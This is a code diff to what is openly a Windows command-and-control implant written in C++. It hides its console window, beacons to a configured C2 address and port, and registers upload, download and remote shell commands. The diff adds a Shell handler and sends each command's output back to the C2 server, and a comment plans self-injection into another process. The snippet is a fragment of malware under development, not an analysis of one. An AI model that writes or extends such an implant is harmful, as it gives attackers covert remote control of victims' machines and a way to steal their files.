@@ -8,10 +8,10 @@
 #include <Windows.h>
 #include <WinHttp.h>
 
-
 #include "Config.h"
-#include "Agent.cpp"
-#include "Command.cpp"
+#include "Agent.h"
+#include "Command.h"
+#include "Shell.h"
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -21,9 +21,12 @@ int main()
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	Agent agent(C2_IP, C2_PORT);
 	Command cmdHandler;
+	Shell shell;
+
 	// add inject self into smth else/
 	//Agent::Register();
-	cmdHandler.RegisterCommand(UPLOAD_CMD, "upload");
+
+	cmdHandler.RegisterCommand(UPLOAD_CMD, shell);
 	cmdHandler.RegisterCommand(DOWNLOAD_CMD, "download");
 	cmdHandler.RegisterCommand(SHELL_CMD, "shell");
 
@@ -35,7 +38,11 @@ int main()
 			std::string Command = Task[0];
 
 			if (cmdHandler.HasCommand(Command)) {
-				cmdHandler.ExecuteCommand(Command);
+				std::string result;
+				
+				result = cmdHandler.ExecuteCommand(Command);
+
+				agent.Post(result);
 			}		
 		}
 
